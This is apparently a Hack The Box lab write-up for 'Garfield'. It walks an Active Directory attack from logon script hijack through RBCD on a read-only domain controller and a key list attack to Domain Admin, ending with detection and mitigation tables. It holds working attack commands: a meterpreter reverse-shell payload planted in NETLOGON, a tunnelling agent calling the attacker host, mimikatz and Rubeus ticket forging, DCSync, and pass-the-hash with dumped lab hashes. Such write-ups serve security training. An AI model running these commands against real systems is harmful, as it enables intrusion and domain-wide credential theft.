# Lab: Garfield (HTB Hard) — RODC Abuse → Key List Attack → Domain Admin

## Overview

Hard-difficulty Active Directory lab built around a **Read-Only Domain Controller (RODC)**. The chain starts from a low-privileged `IT Support` account, abuses a writable `scriptPath` attribute to hijack a logon script, escalates to `l.wilson_adm`, abuses delegated control over the RODC object to weaken its Password Replication Policy, performs an **RBCD attack** to obtain SYSTEM on the RODC, dumps the **per-RODC `krbtgt_8245`** account, and finishes with a **Key List Attack** against the writable DC to recover the Administrator NTLM hash.

The lab demonstrates why RODCs — despite being "read-only" — are a high-value target: a single compromised RODC can become a bridge to fully compromise the writable DC.

## Topology

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   DC01       │    │   RODC01     │    │   Parrot     │
│ Win Server   │────│ Win Server   │────│   Parrot OS  │
│ 10.129.244.207│   │ 192.168.100.2│    │ 10.10.14.14  │
│ Writable DC  │    │  Read-Only DC│    │   Attacker   │
└──────────────┘    └──────────────┘    └──────────────┘
        │                   │
        └─────── internal ──┘
              192.168.100.0/24
```

## Environment

| Component | Version |
|---|---|
| Writable DC | Windows Server 2019 (Build 17763) — `DC01.garfield.htb` |
| RODC | Windows Server 2019 (Build 17763) — `RODC01.garfield.htb` |
| Attacker | Parrot OS |
| Domain | `garfield.htb` |
| Internal subnet | `192.168.100.0/24` |

## Attack Chain

```
j.arbuckle (IT Support)
  │ WRITE scriptPath + RWXD on NETLOGON
  ▼
l.wilson (logon script → reverse shell)
  │ ForceChangePassword
  ▼
l.wilson_adm
  │ MemberOf Tier 1 → AddSelf RODC Administrators
  │ WriteAccountRestrictions on RODC01$
  ▼
RBCD on RODC01$ (via DC02$) → SYSTEM on RODC01
  │
  ├── Dump krbtgt_8245 (AES256)
  └── Weaken msDS-RevealOnDemandGroup / NeverRevealGroup
        │
        ▼
RODC Golden Ticket + Key List Attack on DC01
  │
  ▼
Administrator NTLM hash → DCSync → Domain Admin
```

## Accounts

| Name | Sam | Password | Group |
|---|---|---|---|
| Jon Arbuckle | j.arbuckle | Th1sD4mnC4t!@1978 | IT Support, Domain Users |
| Liz Wilson | l.wilson | — (hijacked via logon script) | Domain Users |
| Liz Wilson ADM | l.wilson_adm | Password1 (reset) | Tier 1 |
| Administrator | Administrator | — (hash) | Domain Admins |
| RODC krbtgt | krbtgt_8245 | — (dumped) | — |
| Machine | DC02$ | Password1 | Domain Computers |

## Vulnerabilities

| # | Vulnerability | Where | MITRE |
|---|---|---|---|
| 1 | Writable `scriptPath` attribute | `j.arbuckle` → `l.wilson`, `l.wilson_adm`, `Guest` | T1098 |
| 2 | RWXD on NETLOGON share | `IT Support` group | T1037.001 |
| 3 | ForceChangePassword ACL | `l.wilson` → `l.wilson_adm` | T1098 |
| 4 | AddSelf on RODC Administrators | `Tier 1` → `RODC Administrators` | T1098 |
| 5 | WriteAccountRestrictions on RODC01$ | `l.wilson_adm` → `RODC01$` | T1098 |
| 6 | Weak Password Replication Policy | RODC01 `msDS-RevealOnDemandGroup` | T1558.004 |
| 7 | RODC krbtgt dumpable | `krbtgt_8245` on RODC01 | T1003.004 |
| 8 | Key List Attack | RODC ticket → DC01 | T1558.004 |
| 9 | DCSync | Administrator hash | T1003.006 |

## Attack Steps

### 1. Recon

**Nmap:**

```bash
nmap -sC -sV -Pn 10.129.244.207 -oN ./nmap.txt
```

**Key output:**

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows
```

**Add to /etc/hosts:**

```bash
echo "10.129.244.207 DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts
```

**Initial credentials:** `j.arbuckle : Th1sD4mnC4t!@1978`

### 2. Enumeration

**Domain users via LDAP:**

```bash
nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
```

**Output (trimmed):**

```
LDAP  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb)
LDAP  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
LDAP  DC01  [*] Enumerated 7 domain users
LDAP  DC01  -Username-        -Last PW Set-       -BadPW-
LDAP  DC01  Administrator     2025-10-03 17:29:26 0
LDAP  DC01  Guest             <never>             0
LDAP  DC01  krbtgt            2025-08-13 11:05:26 0
LDAP  DC01  krbtgt_8245       2025-08-17 11:33:39 0   ← RODC krbtgt
LDAP  DC01  j.arbuckle        2025-09-09 15:50:55 0
LDAP  DC01  l.wilson          2026-01-27 21:40:33 0
LDAP  DC01  l.wilson_adm      2026-01-13 14:56:35 2
```

**Note the `krbtgt_8245` account** — this is the per-RODC krbtgt. Its presence confirms an RODC exists in the domain.

**SMB share spidering:**

```bash
nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M spider_plus
```

**Output:**

```
SMB  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True)
SMB  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SPIDER_PLUS  [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS  [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS  [*] Total files found:    8
```

**Inspect metadata:**

```bash
cat /home/wither/.nxc/modules/nxc_spider_plus/10.129.244.207.json
```

**Interesting file:** `NETLOGON/printerDetect.bat` (217 B). Let's grab it.

```bash
smbclient //garfield.htb/NETLOGON -U 'j.arbuckle%Th1sD4mnC4t!@1978'
smb: \> get printerDetect.bat
smb: \> exit

cat printerDetect.bat
```

**Content:**

```bat
@echo off
echo Detecting installed printers...
echo ==============================

wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table

echo.
echo Printer detection completed.
pause
```

Not directly exploitable, but it confirms that **NETLOGON is used to host logon scripts** — a key observation for the next steps.

**BloodHound collection:**

```bash
bloodhound-python -dc 'DC01.garfield.htb' -d 'garfield.htb' \
  -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -ns 10.129.244.207 --zip -c All
```

### 3. BloodHound Analysis — Path to l.wilson

![BloodHound — j.arbuckle memberOf IT Support](screenshots/j.arbucklememberITsupp.png)

`j.arbuckle` is a member of **IT Support** and **Domain Users**. No direct outbound DACL edges, but the group membership is what matters: `IT Support` has **RWXD on the NETLOGON share** and `j.arbuckle` has a writable `scriptPath` on several users.

**Verify writable ACEs with bloodyAD:**

```bash
bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable --detail
```

**Output (trimmed):**

```
distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
thumbnailPhoto: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE                          ← target

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

**Verify share permissions:**

```bash
smbcacls //garfield.htb/NETLOGON '/' -U 'j.arbuckle%Th1sD4mnC4t!@1978'
```

**Output:**

```
ACL:GARFIELD\IT Support:ALLOWED/OI|CI/RWXD
```

**Result:** `IT Support` has **RWXD** on NETLOGON, and `j.arbuckle` has **WRITE `scriptPath`** on `l.wilson`. This is the classic **Logon Script Hijack**.

### 4. Foothold — Logon Script Hijack

**How it works:** When `l.wilson` logs on, Windows reads the `scriptPath` attribute from their AD object and executes the referenced script from `\\<DC>\NETLOGON\`. If we can write to NETLOGON and control `scriptPath`, we control code execution in the context of `l.wilson`.

**Generate a payload:**

```bash
printf '@echo off\r\n%s\r\n' \
  "$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f psh-cmd | tail -n 1)" \
  > audit-check.bat
```

**Start the handler:**

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
  set LHOST 10.10.14.14; set LPORT 443; run"
```

**Upload the payload to NETLOGON:**

```bash
smbclient //garfield.htb/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
  -c 'cd garfield.htb\scripts; put audit-check.bat audit-check.bat'
```

**Output:**

```
putting file audit-check.bat as \garfield.htb\scripts\audit-check.bat
```

**Set `scriptPath` on l.wilson:**

```bash
bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
  scriptPath -v audit-check.bat
```

**Output:**

```
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

**Wait for l.wilson to log in. Reverse shell arrives:**

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.14:443
[*] Sending stage (244806 bytes) to 10.129.197.153
[*] Meterpreter session 1 opened (10.10.14.14:443 -> 10.129.197.153:64687)

meterpreter > getuid
Server username: GARFIELD\l.wilson
```

**Result:** shell as `GARFIELD\l.wilson`.

### 5. Escalation — l.wilson → l.wilson_adm

![BloodHound — l.wilson ForceChangePassword l.wilson_adm](screenshots/l.wilsonChangePass.png)

BloodHound shows `l.wilson` has **ForceChangePassword** on `l.wilson_adm`.

**Reset the password from the meterpreter shell:**

```powershell
$pw = ConvertTo-SecureString 'Password1' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $pw -Reset
```

**Verify via WinRM:**

```bash
evil-winrm -i garfield.htb -u 'l.wilson_adm' -p Password1
```

**Output:**

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami
garfield\l.wilson_adm
```

### 6. BloodHound Analysis — Path to RODC01

![BloodHound — Tier 1 AddSelf RODC Administrators](screenshots/l.wilson_admRBCDRODC.png)

Two edges stand out:

- `l.wilson_adm` **MemberOf** `Tier 1`
- `Tier 1` **AddSelf** `RODC Administrators`
- `l.wilson_adm` **WriteAccountRestrictions** on `RODC01$`

![BloodHound — RODC01 krbtgt relationship](screenshots/RODCChangePasskrbtgt.png)

**Interpretation:**

- **AddSelf on RODC Administrators** — any member of `Tier 1` can add themselves to the `RODC Administrators` group.
- **WriteAccountRestrictions on RODC01$** — `l.wilson_adm` can modify sensitive attributes on the RODC computer object, including `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup` (the Password Replication Policy).

**Confirm group membership:**

```powershell
*Evil-WinRM* PS> whoami /groups | findstr "Tier"
GARFIELD\Tier 1    Group    S-1-5-21-...-3108    Mandatory group, Enabled by default, Enabled group
```

### 7. Add Self to RODC Administrators

```bash
bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Password1' \
  add groupMember "RODC Administrators" l.wilson_adm
```

**Verify:**

```powershell
*Evil-WinRM* PS> net group "RODC Administrators" /domain
Members
-------------------------------------------------------------------------------
l.wilson_adm
The command completed successfully.
```

### 8. Internal Recon — Locate RODC01

**IP config on DC01 (from l.wilson_adm shell):**

```powershell
*Evil-WinRM* PS> ipconfig
```

**Output (trimmed):**

```
Ethernet adapter vEthernet (Switch01):
   IPv4 Address. . . . . . . . . . . : 192.168.100.1

Ethernet adapter Ethernet0 3:
   IPv4 Address. . . . . . . . . . . : 10.129.197.153
```

DC01 is dual-homed. The `192.168.100.0/24` subnet is internal — RODC01 lives there.

**Scan the internal subnet:**

```powershell
*Evil-WinRM* PS C:\temp> .\fscan.exe -h 192.168.100.0/24
```

**Output (trimmed):**

```
(icmp) Target 192.168.100.1   is alive
(icmp) Target 192.168.100.2   is alive
192.168.100.2:445 open
192.168.100.2:139 open
192.168.100.2:135 open
192.168.100.2:88 open
[*] NetBios 192.168.100.2   [+] DC:GARFIELD\RODC01
[*] NetInfo
[*]192.168.100.2
   [->]RODC01
   [->]192.168.100.2
```

**Add to /etc/hosts:**

```bash
echo "192.168.100.2 RODC01.garfield.htb" | sudo tee -a /etc/hosts
```

**Tunnel the internal subnet via Ligolo-ng:**

```bash
# Attacker
sudo ./proxy -selfcert
ligolo-ng > ifcreate --name ligolo
ligolo-ng > route_add --name ligolo --route 192.168.100.0/24
ligolo-ng > session      # select the agent session
ligolo-ng > start
```

```powershell
# Victim (DC01, via WinRM)
Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect 10.10.14.14:11601 -ignore-cert" -WindowStyle Hidden
```

### 9. RBCD Attack on RODC01

**Create a machine account:**

```bash
bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Password1' \
  add computer 'DC02' 'Password1'
```

**Output:**

```
[+] DC02$ created
```

**Configure RBCD on RODC01$:**

```bash
bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Password1' \
  add rbcd 'RODC01$' 'DC02$'
```

**Output:**

```
[+] DC02$ can now impersonate users on RODC01$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+pw://None\l.wilson_adm:Password1@DC01.garfield.htb/?serverip=10.129.197.153' 'HOST/RODC01$@None' 'Administrator@None'
```

**Sync time:**

```bash
sudo ntpdate -u DC01.garfield.htb
```

**Request a service ticket as Administrator for cifs/RODC01:**

```bash
getST.py GARFIELD.HTB/'DC02$':'Password1' \
  -spn cifs/RODC01.garfield.htb \
  -impersonate Administrator \
  -dc-ip 10.129.197.153
```

**Output:**

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

**Use the ticket with psexec:**

```bash
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
psexec.py -k -no-pass GARFIELD.HTB/Administrator@RODC01.garfield.htb
```

**Output:**

```
[*] Requesting shares on RODC01.garfield.htb.....
[*] Found writable share ADMIN$
[*] Uploading file yuVUFwrF.exe
[*] Opening SVCManager on RODC01.garfield.htb.....
[*] Creating service wSvN on RODC01.garfield.htb.....
[*] Starting service wSvN.....

C:\Windows\system32> whoami
nt authority\system
```

**Result:** SYSTEM on RODC01.

### 10. Dump krbtgt_8245

Each RODC has its own `krbtgt_XXXXX` account. For RODC01 it is `krbtgt_8245`. Dumping it gives us the key needed to forge RODC tickets.

**Upload mimikatz and dump:**

```cmd
c:\temp> mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

**Output (trimmed):**

```
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
```

**Key material:**

```
krbtgt_8245 AES256 = d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

### 11. Weaken Password Replication Policy

To perform a Key List attack we must allow the RODC to cache the Administrator credentials. `l.wilson_adm` has **WriteAccountRestrictions** on `RODC01$`, so it can modify `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup`.

**Add Administrator to RevealOnDemandGroup:**

```bash
bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Password1' \
  set object 'RODC01$' msDS-RevealOnDemandGroup \
  -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' \
  -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
```

**Output:**

```
[+] RODC01$'s msDS-RevealOnDemandGroup has been updated
```

**Clear NeverRevealGroup:**

```bash
bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Password1' \
  set object 'RODC01$' msDS-NeverRevealGroup
```

**Output:**

```
[+] RODC01$'s msDS-NeverRevealGroup has been updated
```

### 12. Key List Attack

With the RODC krbtgt key in hand, we can forge a valid RODC ticket and present it to the writable DC. The writable DC trusts RODC-issued tickets (signed with `krbtgt_8245`) and, because we just allowed Administrator to be cached, will respond to a **Key List** request with the Administrator keys.

**Forge an RODC Golden Ticket with Rubeus:**

```cmd
.\Rubeus.exe golden `
  /rodcNumber:8245 `
  /flags:forwardable,renewable,enc_pa_rep `
  /nowrap `
  /outfile:administrator.kirbi `
  /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
  /user:Administrator `
  /id:500 `
  /domain:garfield.htb `
  /sid:S-1-5-21-2502726253-3859040611-225969357
```

**Request the Key List from DC01:**

```cmd
.\Rubeus.exe asktgs /enctype:aes256 /keyList `
  /service:krbtgt/garfield.htb `
  /dc:DC01.garfield.htb `
  /ticket:administrator.kirbi /nowrap
```

**Output (trimmed):**

```
[*] Action: Ask TGS
[*] Requesting 'aes256_cts_hmac_sha1' etype for the service ticket
[*] Building KeyList TGS-REQ request for: 'Administrator'
[*] Using domain controller: DC01.garfield.htb
[+] TGS request successful!
[*] base64(ticket.kirbi):
      doIFnjCCBZqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoQ4bDEdBUkZJRUxELkhUQq...
...
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  GARFIELD.HTB
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  f+VSulvY4faqG4qvLda9jvxR+IQf6EMH5PtmuytKEbs=
  Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

**Result:** Administrator NTLM hash = `ee238f6debc752010428f20875b092d5`.

### 13. DCSync

**Convert the ticket for Impacket:**

```bash
echo -n 'doIFnjCCBZqgA...' | tr -d ' \r\n\t' | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

**Dump NTDS.DIT:**

```bash
secretsdump.py -k -no-pass DC01.garfield.htb
```

**Output (trimmed):**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:077a59724e58efbf6608853652a66f80:::
krbtgt_8245:1603:aad3b435b51404eeaad3b435b51404ee:445aa4221e751da37a10241d962780e2:::
garfield.htb\j.arbuckle:3101:...:f705091e5d14d5c25ace5f52ea4d8ecb:::
garfield.htb\l.wilson:3105:...:dc6e2c16d8baac7cc239f160783ae2b0:::
garfield.htb\l.wilson_adm:3107:...:702f4bf66b850ec7e0d3b9db47ed6782:::
RODC01$:1602:...:0a3f810964bb5e1f0e52245f73700172:::
DC02$:10601:...:702f4bf66b850ec7e0d3b9db47ed6782:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:53b9e15b84f5b44ca093b5a74098b26aae113a806a9a7ff647754dc6518e9c29
krbtgt:aes256-cts-hmac-sha1-96:d11af60335016c1fb36af5f3a25932c669c776c7243f914e1c5639e910fbf165
krbtgt_8245:aes256-cts-hmac-sha1-96:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

### 14. Domain Admin

**Pass-the-Hash with Evil-WinRM:**

```bash
evil-winrm -i garfield.htb -u 'Administrator' -H 'ee238f6debc752010428f20875b092d5'
```

**Output:**

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
garfield\administrator
```

**Result:** Domain Admin.

## Detection

| Attack | Event ID | Source |
|---|---|---|
| LDAP user enumeration | 4662 | DC Security Log |
| `scriptPath` modification | 5136 | DC Security Log |
| Logon script execution | 4104 / 4688 | DC / Workstation |
| ForceChangePassword | 4724 | DC Security Log |
| AddSelf to privileged group | 4728 / 4732 | DC Security Log |
| RBCD configuration | 5136 (`msDS-AllowedToActOnBehalfOfOtherIdentity`) | DC Security Log |
| RODC krbtgt dump | 4662 / LSASS access | RODC Security Log |
| `msDS-RevealOnDemandGroup` change | 5136 | DC Security Log |
| Key List attack | 4769 (TGS-REQ with KeyList flag) | DC Security Log |
| DCSync | 4662 (Replicating Directory Changes) | DC Security Log |

**What to look for:**

- **5136** — `scriptPath` modified by a non-admin (`j.arbuckle`).
- **4724** — password reset (`l.wilson` → `l.wilson_adm`).
- **4728/4732** — user added to `RODC Administrators`.
- **5136** — `msDS-AllowedToActOnBehalfOfOtherIdentity`, `msDS-RevealOnDemandGroup`, or `msDS-NeverRevealGroup` modified.
- **4769** — TGS request with the Key List flag against `krbtgt`.
- **4662** — DCSync (`Replicating Directory Changes`).

## Mitigation

| Attack | Mitigation |
|---|---|
| Writable `scriptPath` | Audit ACLs on user objects; remove unnecessary Write permissions |
| RWXD on NETLOGON | Restrict write access to NETLOGON/SYSVOL scripts |
| ForceChangePassword | Least privilege; audit ACLs on Tier-0 accounts |
| AddSelf on RODC Administrators | Remove `AddSelf`; manage membership centrally |
| WriteAccountRestrictions on RODC | Restrict who can modify RODC computer objects |
| Weak Password Replication Policy | Keep `NeverRevealGroup` populated; monitor changes |
| RODC krbtgt dump | Protect RODC hosts; monitor LSASS access |
| Key List Attack | Monitor TGS KeyList requests; alert on cross-DC RODC tickets |
| DCSync | Audit `Replicating Directory Changes`; never grant to non-DC accounts |

## References

- [MITRE ATT&CK](https://attack.mitre.org/)
- [HackTricks — AD Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [The Hacker Recipes — RODC](https://www.thehacker.recipes/ad/movement/rodc)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
